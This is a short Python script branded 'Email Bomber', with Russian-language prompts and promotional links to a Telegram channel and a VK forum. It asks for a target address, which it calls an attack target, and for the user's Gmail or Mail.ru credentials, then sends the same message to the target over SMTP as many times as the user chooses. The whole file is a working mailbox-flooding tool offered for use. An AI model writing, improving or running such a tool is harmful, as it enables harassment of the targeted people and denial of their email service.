import smtplib
import time
import os

os.system('cls' if os.name == 'nt' else 'clear')
print (" _________    __        __        ____        ________    __                                          ")
print (" |########|  |##\      /##|      /####\      |########|  |##|                                         ")
print (" |##|____    |###\ __ /###|     /##/\##\        |##|     |##|                                         ")
print (" |########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___  ")
print (" |##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__| ")
print (" |########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \ ")
print ("")
print (" Telegram Channel: t.me/hzfnews")
print (" Vk: vk.com/hzforum1")
print ("")

try:
    bomb_email = input("Введите адрес электронной почты на чью почту вы хотите провести эту атаку: ")
    email = input("Введите свою gmail почту: ")
    password = input("Введите свой gmail пароль: ")
    message = input("Введите сообщение: ")
    counter = int(input("Сколько сообщений вы хотите отправить?: "))

    s_ = input('Выберите поставщика почты (Gmail / Mail.ru): ').lower()

    if s_ == "gmail":
        mail = smtplib.SMTP('smtp.gmail.com',587)
    elif s_ == "mail":
        mail = smtplib.SMTP('smtp.mail.ru',587)

    for x in range(0,counter):
        print("Количество отправленных сообщений: ", x+1)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)

    mail.close()
except Exception as e:
    print("Если что-то не так, повторите попытку, указав правильные данные.")
